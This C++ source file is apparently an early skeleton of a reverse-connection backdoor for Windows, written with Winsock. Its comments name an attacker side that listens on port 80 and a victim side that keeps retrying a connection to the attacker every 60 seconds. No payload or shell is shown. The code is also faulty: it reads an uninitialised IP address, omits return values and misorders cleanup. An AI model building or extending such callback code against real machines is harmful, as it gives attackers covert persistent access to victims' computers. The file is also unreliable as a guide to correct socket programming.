#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <iostream>
#include <string>
using namespace std;

#pragma comment(lib, "WS2_32.Lib")

//Functions
int startWinsock(string ClientOrServer);
int endWinsock(SOCKET socket);
void wait(long int seconds);

int endWinsock(SOCKET socket)
{
	//End winsock

	WSACleanup();
	closesocket(socket);
}

void wait(long int seconds)
{
	seconds = seconds * 1000;
	Sleep(seconds);
}

int startWinsock(string ClientOrServer)
{
	//Start winsock

	//Variables
	int nret;
	WSAData wsdata; //Declare WSAData
	WORD wsver; //Winsock version
	SOCKET kSock;
	sockaddr_in sIN;
	char ipAddress[15];
	
	//Calculate
	wsver = MAKEWORD(2, 2); //We want Winsock 2.0
	nret = WSAStartup(wsver, &wsdata); //Pass version 2.0 and pointer to implement
	if(nret != 0)
	{ 
		//Init failed
		/*A successful return value should be 0 */
		cout << "Startup failed, error code: " << WSAGetLastError(); //Returns error code
		WSACleanup(); //Cleanup Winsock library
		return 0;
	}
	cout << "Init success\n";
	kSock = socket(AF_INET, SOCK_STREAM, 0);
	if(kSock == INVALID_SOCKET)
	{
		cout << "Socket init failed";
		return 0;
	}
	cout << "Socket initialized\n";
	sIN.sin_port = htons(80); //Port number
	if (ClientOrServer == "client") //attacker will listen for connections when ready
	{
		sIN.sin_addr.s_addr = INADDR_ANY;
		sIN.sin_family = AF_INET;
		if(bind(kSock,(sockaddr*)&sIN, sizeof(sIN)) == SOCKET_ERROR)
		{
			cout << "Failed to bind\n";
			WSACleanup(); //Cleanup Winsock library
			return 0;
		}
		cout << "Bind successful!\n";
		while (listen(kSock, SOMAXCONN) == SOCKET_ERROR); //Loop in order to constantly listen
	}
	if (ClientOrServer == "server") //victim will continuously try to connect to attacker
	{
		sIN.sin_addr.s_addr = inet_addr(ipAddress);
		sIN.sin_family = AF_INET;
		while(connect(kSock,(sockaddr*)&sIN, sizeof(sIN)) == SOCKET_ERROR)
		{ 
			/*//Check the condition
			cout << "Connect failed, error: " << WSAGetLastError(); //Returns error code
			WSACleanup(); //Cleanup the library
			return -1;*/
			
			//Delay to prevent 100% cpu usage
			wait(60); //sleep for 60 seconds
		}
	}

}